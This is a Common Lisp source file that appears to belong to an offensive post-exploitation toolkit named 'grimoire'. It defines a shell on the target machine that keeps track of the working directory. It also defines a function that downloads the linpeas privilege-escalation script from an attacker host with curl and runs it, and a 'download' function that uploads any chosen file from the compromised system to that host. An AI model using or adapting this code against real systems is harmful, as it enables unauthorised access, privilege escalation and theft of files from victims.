(in-package #:grimoire)

(defparameter *current-dir* nil)

(defun exec-keep-pwd (command)
  (if (str:starts-with? "cd " command)
      (setf *current-dir* 
            (grm/exec (format nil "cd ~a && cd ~a && pwd"
                              *current-dir*
                              (str:replace-first "cd " "" command))))
      (grm/exec (format nil "cd ~a && ~a" *current-dir* command))))

(defun fake-repl-prompt ()
  (format t "~%[~a]$ " *current-dir*)
  (force-output)
  (read-line))

(grm/defun fake-repl (:exec) ()
  "gives a 'fake' repl that allows for command execution and follows cd commands"
  (setf *current-dir* (grm/exec "pwd"))

  ;; repl
  (loop for command = (fake-repl-prompt)
        if (equal command "exit") do (return)
        else do (format t "~a~%" (exec-keep-pwd command))))

(grm/defun linpeas (:exec) ()
  (format t "[+] Downloading linpeas~%")
  (grm/exec (format nil "curl http://~a:5000/tools/linpeas.sh > /tmp/linpeas.sh"
                    *host-ip*))
  (format t "[+] Running linpeas.sh~%")
  (grm/exec "sh /tmp/linpeas.sh > /tmp/output.txt")
  (format t "[+] Results:~%")
  (grm/exec "cat /tmp/output.txt"))

(grm/defun download (:exec) (path)
  (grm/exec (format nil "curl -F \"file=@~a\" http://~a:5000/upload/" 
                    path *host-ip*)))